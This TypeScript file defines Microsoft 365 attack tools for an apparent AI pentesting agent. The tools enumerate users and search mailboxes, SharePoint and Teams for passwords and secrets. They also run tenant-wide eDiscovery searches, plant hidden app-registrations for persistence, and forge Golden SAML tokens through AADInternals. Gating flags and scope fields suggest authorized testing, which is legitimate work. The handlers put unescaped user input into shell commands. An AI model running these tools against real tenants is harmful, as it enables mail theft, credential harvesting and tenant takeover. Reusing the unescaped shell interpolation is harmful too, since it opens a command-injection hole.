import { executeInKali } from "../utils/docker-exec";

// =============================================================================
// IDENTITY — Microsoft 365 / O365 tools
//
// M365 sits on top of an Entra token: once a token is held, M365 is a
// data-access surface (mailbox, SharePoint/OneDrive, Teams) plus the deeper
// tenant-takeover primitives (eDiscovery, app-registration persistence,
// AADInternals Golden SAML / sync abuse).
//
// Mirrors the cloud-recon.ts / cloud-iam.ts pattern exactly:
//   - each tool builds a commands[] array, joins with " && ", returns raw output
//   - tool-availability preflight (command -v / test -f ... && "INSTALLED" || "NOT INSTALLED")
//   - 2>&1 (NOT 2>/dev/null) so real auth errors surface (the cloud W1b lesson)
//
// PowerShell-only modules (GraphRunner, AADInternals) are cloned to
// /opt/identity-ps and invoked via `pwsh -Command`. Python tools (o365spray)
// live in the /opt/identity-tools venv.
//
// Every tool takes `tenant_id` so the parent scope validator can pin it to the
// in-scope M365 org (the identity analog of cloud's `cloud_account_id`).
//
// SAFETY (the Lockout Mandate, §15.1): enum_o365_users (user enumeration) takes a
// `lockout_threshold` and stays SAFE — enumeration uses no password attempts, but
// the threshold is read so any escalation to a spray path can never exceed it.
//
// NON-DESTRUCTIVE DEFAULTS: eDiscovery tenant-wide search, app-registration
// persistence, and AADInternals attacks are gated behind explicit
// `attempt_*: boolean` args defaulting to false (mirrors cloud's attempt_write).
// Data-read tools (mailbox / SharePoint / Teams) are read-only.
// =============================================================================

const PS_DIR = "/opt/identity-ps";

export const identityM365Tools = [
  // ---------------------------------------------------------------------------
  // RECON / SURFACE MAPPING
  // ---------------------------------------------------------------------------
  {
    name: "enum_o365_users",
    description:
      "O365/Entra user-existence enumeration via o365spray --enum (login-based existence oracle). Recon only — no password attempts. Reads lockout_threshold so any later spray path stays under it.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID or domain for scope validation",
        },
        domain: {
          type: "string",
          description: "Tenant domain to enumerate against (e.g. corp.onmicrosoft.com)",
        },
        userlist: {
          type: "array",
          items: { type: "string" },
          description: "Candidate usernames/emails to test for existence",
        },
        lockout_threshold: {
          type: "number",
          description: "Tenant Smart Lockout threshold — read for safety even though enum sends no password attempts.",
        },
      },
      required: ["tenant_id", "userlist"],
    },
  },
  {
    name: "enum_m365_surface",
    description:
      "Map which M365 services a held token can reach: MFASweep per-protocol coverage + Graph /me, /users, /sites probes. Recon only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A held Entra access token (brokered)",
        },
      },
      required: ["tenant_id"],
    },
  },

  // ---------------------------------------------------------------------------
  // DATA ACCESS (read-only)
  // ---------------------------------------------------------------------------
  {
    name: "access_mailbox",
    description:
      "Read/search an in-scope mailbox via GraphRunner Get-Inbox/Invoke-SearchMailbox (or Graph /messages) to prove Mail.Read blast radius. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A token with Mail.Read scope (brokered)",
        },
        mailbox: {
          type: "string",
          description: "Target mailbox UPN (must NOT be an excluded mailbox); defaults to the token owner (/me)",
        },
        search_terms: {
          type: "array",
          items: { type: "string" },
          description: "Keywords to search the mailbox for (e.g. ['password','secret','vpn'])",
        },
      },
      required: ["tenant_id", "access_token"],
    },
  },
  {
    name: "search_sharepoint_onedrive",
    description:
      "Keyword-search tenant SharePoint/OneDrive for secrets/PII via GraphRunner Invoke-SearchSharePointAndOneDrive (or Graph /search). Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A token with Files.Read.All / Sites.Read.All scope (brokered)",
        },
        search_terms: {
          type: "array",
          items: { type: "string" },
          description: "Keywords to search drives/sites for (e.g. ['password','confidential','ssn'])",
        },
      },
      required: ["tenant_id", "access_token", "search_terms"],
    },
  },
  {
    name: "access_teams",
    description:
      "Read Teams chats/channel messages via GraphRunner Get-TeamsChat (or Graph /chats, /teams). Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A token with Chat.Read / ChannelMessage.Read.All scope (brokered)",
        },
        search_terms: {
          type: "array",
          items: { type: "string" },
          description: "Keywords to filter Teams messages for",
        },
      },
      required: ["tenant_id", "access_token"],
    },
  },

  // ---------------------------------------------------------------------------
  // HIGH-IMPACT / PERSISTENCE (user-confirm, gated)
  // ---------------------------------------------------------------------------
  {
    name: "abuse_ediscovery",
    description:
      "Tenant-wide Compliance Center / eDiscovery search (the 'search everyone's mail' power). HIGH IMPACT: only runs the tenant-wide search when attempt_search=true (default false). Requires a compliance-admin token.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A compliance-admin token (brokered)",
        },
        query: {
          type: "string",
          description: "KQL search query to run tenant-wide (e.g. 'password OR confidential')",
        },
        attempt_search: {
          type: "boolean",
          description: "Actually run the tenant-wide eDiscovery search (default false = capability probe only)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "abuse_app_registration",
    description:
      "Plant a hidden app-registration persistence (consent-free Graph access) via GraphRunner/AADInternals. PERSISTENCE WRITE: only creates the registration when attempt_persist=true (default false).",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A token with application-write rights (brokered)",
        },
        app_name: {
          type: "string",
          description: "Display name for the persistence app",
          default: "maestro-persist-test",
        },
        attempt_persist: {
          type: "boolean",
          description: "Actually create the hidden app-registration persistence (default false = candidate analysis only)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "aadinternals_attack",
    description:
      "AADInternals Golden SAML / immutableID / AD-Connect-sync abuse — the deepest M365 tenant-takeover primitives (PowerShell). HIGHEST IMPACT, multi-step: only executes the attack when attempt_attack=true (default false). Linux-host-bound functions documented PARTIAL.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "M365/Entra tenant ID for scope validation",
        },
        attack: {
          type: "string",
          enum: ["golden_saml", "immutable_id", "sync_abuse", "tenant_info"],
          description: "Which AADInternals primitive to run (tenant_info is read-only recon)",
          default: "tenant_info",
        },
        adfs_token_signing_cert: {
          type: "string",
          description: "Path to the ADFS token-signing cert (PFX) for Golden SAML (brokered, lab-only)",
        },
        target_user: {
          type: "string",
          description: "Target user UPN to impersonate / set immutableID for (must NOT be excluded)",
        },
        attempt_attack: {
          type: "boolean",
          description: "Actually execute the attack write op (default false = capability/recon only)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
];

export const identityM365Handlers: Record<string, Function> = {
  // ---------------------------------------------------------------------------
  // RECON / SURFACE MAPPING
  // ---------------------------------------------------------------------------
  enum_o365_users: async (args: {
    tenant_id: string;
    domain?: string;
    userlist: string[];
    lockout_threshold?: number;
  }) => {
    const { tenant_id, domain, userlist, lockout_threshold } = args;
    const dom = domain || tenant_id;

    const commands: string[] = [
      `echo "=== O365 User Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${dom}"`,
      `echo "Candidates: ${userlist.length}"`,
      `echo "Lockout threshold (read for safety; enum sends no passwords): ${lockout_threshold ?? "(not provided)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v o365spray >/dev/null 2>&1 && echo "o365spray: INSTALLED" || echo "o365spray: NOT INSTALLED"`,
      `echo ""`,
      `printf '%s\\n' ${userlist.map((u) => `'${u}'`).join(" ")} > /tmp/o365-users.txt`,
      `echo "--- o365spray --enum (existence oracle, no password attempts) ---"`,
      `o365spray --enum --userfile /tmp/o365-users.txt --domain ${dom} 2>&1 || echo "o365spray enum FAILED (see stderr above; enum needs no auth, so this is tool/network)"`,
      `echo ""`,
      `echo "=== O365 User Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_m365_surface: async (args: {
    tenant_id: string;
    access_token?: string;
  }) => {
    const { tenant_id, access_token } = args;
    const authHeader = access_token ? `-H "Authorization: Bearer ${access_token}"` : "";

    const commands: string[] = [
      `echo "=== M365 Service Surface Mapping ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/MFASweep/MFASweep.ps1 && echo "MFASweep: PRESENT" || echo "MFASweep: NOT PRESENT (${PS_DIR}/MFASweep)"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Graph /me (identity) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/me" 2>&1 | head -c 6000 || echo "/me probe FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Graph /users (directory read reachability) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/users?\\$top=10" 2>&1 | head -c 8000 || echo "/users probe FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Graph /sites (SharePoint reachability) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/sites?search=*" 2>&1 | head -c 8000 || echo "/sites probe FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- MFASweep per-protocol coverage (if present) ---"`,
      `if [ -f ${PS_DIR}/MFASweep/MFASweep.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/MFASweep/MFASweep.ps1; Get-Help Invoke-MFASweep" 2>&1 | head -c 4000; else echo "MFASweep not present — skipping (Graph probes above map reachable surface)"; fi`,
      `echo ""`,
      `echo "=== M365 Surface Mapping Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  // ---------------------------------------------------------------------------
  // DATA ACCESS (read-only)
  // ---------------------------------------------------------------------------
  access_mailbox: async (args: {
    tenant_id: string;
    access_token: string;
    mailbox?: string;
    search_terms?: string[];
  }) => {
    const { tenant_id, access_token, mailbox, search_terms = [] } = args;
    const authHeader = `-H "Authorization: Bearer ${access_token}"`;
    const target = mailbox ? `users/${mailbox}` : "me";

    const commands: string[] = [
      `echo "=== Mailbox Access (read-only) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Mailbox: ${mailbox || "(token owner /me)"}"`,
      `echo "Search terms: ${search_terms.join(", ") || "(none — listing recent)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 && echo "GraphRunner: PRESENT" || echo "GraphRunner: NOT PRESENT"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Recent messages (Graph /messages) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/${target}/messages?\\$top=20&\\$select=subject,from,receivedDateTime" 2>&1 | head -c 15000 || echo "/messages read FAILED (see stderr above)"`,
      `echo ""`,
    ];

    if (search_terms.length) {
      const q = search_terms.join(" OR ");
      commands.push(`echo "--- Keyword search: ${q} ---"`);
      commands.push(
        `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/${target}/messages?\\$search=%22${encodeURIComponent(q)}%22" 2>&1 | head -c 15000 || echo "mailbox search FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }

    commands.push(`echo "=== Mailbox Access Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  search_sharepoint_onedrive: async (args: {
    tenant_id: string;
    access_token: string;
    search_terms: string[];
  }) => {
    const { tenant_id, access_token, search_terms } = args;
    const authHeader = `-H "Authorization: Bearer ${access_token}"`;

    const commands: string[] = [
      `echo "=== SharePoint / OneDrive Keyword Search (read-only) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Search terms: ${search_terms.join(", ")}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 && echo "GraphRunner: PRESENT" || echo "GraphRunner: NOT PRESENT"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    for (const term of search_terms) {
      commands.push(`echo "--- Graph /search for driveItem: ${term} ---"`);
      commands.push(
        `curl -sS -X POST ${authHeader} -H "Content-Type: application/json" -d '{"requests":[{"entityTypes":["driveItem"],"query":{"queryString":"${term}"}}]}' "https://graph.microsoft.com/v1.0/search/query" 2>&1 | head -c 15000 || echo "driveItem search for '${term}' FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }

    commands.push(`echo "--- GraphRunner Invoke-SearchSharePointAndOneDrive (if present) ---"`);
    commands.push(
      `if [ -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/GraphRunner/GraphRunner.ps1; Get-Help Invoke-SearchSharePointAndOneDrive" 2>&1 | head -c 4000; else echo "GraphRunner not present — used Graph /search above"; fi`
    );
    commands.push(`echo ""`);
    commands.push(`echo "=== SharePoint / OneDrive Search Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  access_teams: async (args: {
    tenant_id: string;
    access_token: string;
    search_terms?: string[];
  }) => {
    const { tenant_id, access_token, search_terms = [] } = args;
    const authHeader = `-H "Authorization: Bearer ${access_token}"`;

    const commands: string[] = [
      `echo "=== Teams Data Access (read-only) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Filter terms: ${search_terms.join(", ") || "(none)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 && echo "GraphRunner: PRESENT" || echo "GraphRunner: NOT PRESENT"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Joined teams ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/me/joinedTeams" 2>&1 | head -c 10000 || echo "joinedTeams read FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Recent chats ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/me/chats?\\$top=20" 2>&1 | head -c 12000 || echo "chats read FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- GraphRunner Get-TeamsChat (if present) ---"`,
      `if [ -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/GraphRunner/GraphRunner.ps1; Get-Help Get-TeamsChat" 2>&1 | head -c 4000; else echo "GraphRunner not present — used Graph /chats above"; fi`,
      `echo ""`,
      `echo "=== Teams Data Access Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  // ---------------------------------------------------------------------------
  // HIGH-IMPACT / PERSISTENCE (user-confirm, gated)
  // ---------------------------------------------------------------------------
  abuse_ediscovery: async (args: {
    tenant_id: string;
    access_token?: string;
    query?: string;
    attempt_search?: boolean;
  }) => {
    const { tenant_id, access_token, query = "password OR confidential", attempt_search = false } = args;
    const authHeader = access_token ? `-H "Authorization: Bearer ${access_token}"` : "";

    const commands: string[] = [
      `echo "=== eDiscovery / Compliance Tenant-Wide Search ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Query: ${query}"`,
      `echo "Attempt tenant-wide search (HIGH IMPACT): ${attempt_search}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    if (!attempt_search) {
      commands.push(`echo "--- CAPABILITY PROBE (attempt_search=false): checking eDiscovery case access only ---"`);
      commands.push(
        `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/security/cases/ediscoveryCases" 2>&1 | head -c 10000 || echo "eDiscovery case probe FAILED (see stderr above; needs compliance-admin token)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "No tenant-wide search run (set attempt_search=true — user-confirm required: tenant-wide reach)."`);
    } else {
      commands.push(`echo "--- WRITE/SEARCH: tenant-wide eDiscovery query ---"`);
      commands.push(
        `curl -sS -X POST ${authHeader} -H "Content-Type: application/json" -d '{"displayName":"maestro-ediscovery-test"}' "https://graph.microsoft.com/v1.0/security/cases/ediscoveryCases" 2>&1 | head -c 8000 || echo "eDiscovery case creation FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "NOTE: tenant-wide search executed per user-confirm. Query was: ${query}"`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== eDiscovery Search Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_app_registration: async (args: {
    tenant_id: string;
    access_token?: string;
    app_name?: string;
    attempt_persist?: boolean;
  }) => {
    const { tenant_id, access_token, app_name = "maestro-persist-test", attempt_persist = false } = args;
    const authHeader = access_token ? `-H "Authorization: Bearer ${access_token}"` : "";

    const commands: string[] = [
      `echo "=== App-Registration Persistence ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "App name: ${app_name}"`,
      `echo "Attempt persistence (WRITE): ${attempt_persist}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 && echo "GraphRunner: PRESENT" || echo "GraphRunner: NOT PRESENT"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    if (!attempt_persist) {
      commands.push(`echo "--- CANDIDATE ANALYSIS (attempt_persist=false): listing existing app registrations ---"`);
      commands.push(
        `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/applications?\\$top=50" 2>&1 | head -c 15000 || echo "applications listing FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "No persistence app created (set attempt_persist=true — user-confirm required: persistence)."`);
    } else {
      commands.push(`echo "--- WRITE: creating hidden app-registration persistence ---"`);
      commands.push(
        `curl -sS -X POST ${authHeader} -H "Content-Type: application/json" -d '{"displayName":"${app_name}","signInAudience":"AzureADMyOrg"}' "https://graph.microsoft.com/v1.0/applications" 2>&1 | head -c 10000 || echo "application creation FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- GraphRunner persistence (if present) ---"`);
      commands.push(
        `if [ -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/GraphRunner/GraphRunner.ps1; Get-Help Invoke-InjectOAuthApp" 2>&1 | head -c 4000; else echo "GraphRunner not present — used Graph /applications above"; fi`
      );
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== App-Registration Persistence Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  aadinternals_attack: async (args: {
    tenant_id: string;
    attack?: string;
    adfs_token_signing_cert?: string;
    target_user?: string;
    attempt_attack?: boolean;
  }) => {
    const {
      tenant_id,
      attack = "tenant_info",
      adfs_token_signing_cert,
      target_user,
      attempt_attack = false,
    } = args;

    const commands: string[] = [
      `echo "=== AADInternals Attack (${attack}) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Target user: ${target_user || "(none)"}"`,
      `echo "Attempt attack (HIGHEST IMPACT, multi-step): ${attempt_attack}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED ($(pwsh -v 2>&1 | head -1))" || echo "pwsh: NOT INSTALLED"`,
      `test -d ${PS_DIR}/AADInternals && echo "AADInternals: PRESENT" || echo "AADInternals: NOT PRESENT (${PS_DIR}/AADInternals)"`,
      `echo ""`,
    ];

    // tenant_info is always-safe read-only recon and may run without the gate.
    if (attack === "tenant_info") {
      commands.push(`echo "--- AADInternals read-only tenant recon (Get-AADIntTenantID / Get-AADIntLoginInformation) ---"`);
      commands.push(
        `if [ -d ${PS_DIR}/AADInternals ]; then pwsh -Command "Import-Module ${PS_DIR}/AADInternals/AADInternals.psd1; Get-AADIntTenantID -Domain '${tenant_id}'; Get-AADIntLoginInformation -Domain '${tenant_id}'" 2>&1 | head -c 8000; else echo "AADInternals not present — cannot run tenant recon"; fi`
      );
    } else if (!attempt_attack) {
      commands.push(`echo "--- CAPABILITY PROBE (attempt_attack=false): ${attack} not executed ---"`);
      commands.push(
        `echo "The ${attack} primitive is a tenant-takeover write op. Set attempt_attack=true with the required inputs (e.g. adfs_token_signing_cert for golden_saml) — user-confirm required. Linux-host-bound functions are documented PARTIAL."`
      );
    } else {
      // Gated, highest-impact path.
      if (attack === "golden_saml") {
        commands.push(`echo "--- WRITE: Golden SAML (New-AADIntSAMLToken) ---"`);
        if (adfs_token_signing_cert && target_user) {
          commands.push(
            `if [ -d ${PS_DIR}/AADInternals ]; then pwsh -Command "Import-Module ${PS_DIR}/AADInternals/AADInternals.psd1; New-AADIntSAMLToken -UPN '${target_user}' -PfxFileName '${adfs_token_signing_cert}'" 2>&1 | head -c 8000; else echo "AADInternals not present"; fi`
          );
        } else {
          commands.push(`echo "golden_saml requires adfs_token_signing_cert AND target_user — missing. Marking PARTIAL."`);
        }
      } else if (attack === "immutable_id") {
        commands.push(`echo "--- WRITE: immutableID manipulation ---"`);
        commands.push(
          `if [ -d ${PS_DIR}/AADInternals ] && [ -n "${target_user || ""}" ]; then pwsh -Command "Import-Module ${PS_DIR}/AADInternals/AADInternals.psd1; Get-AADIntUser -UserPrincipalName '${target_user}'" 2>&1 | head -c 8000; else echo "immutable_id requires target_user and AADInternals. Marking PARTIAL."; fi`
        );
      } else if (attack === "sync_abuse") {
        commands.push(`echo "--- AD-Connect sync abuse (Linux-host-bound — likely PARTIAL) ---"`);
        commands.push(
          `if [ -d ${PS_DIR}/AADInternals ]; then pwsh -Command "Import-Module ${PS_DIR}/AADInternals/AADInternals.psd1; Get-Help Set-AADIntPasswordHashSyncEnabled" 2>&1 | head -c 4000; else echo "AADInternals not present"; fi`
        );
        commands.push(`echo "NOTE: sync abuse typically requires AD Connect host context — document PARTIAL if the container cannot satisfy it."`);
      }
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== AADInternals Attack Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },
};
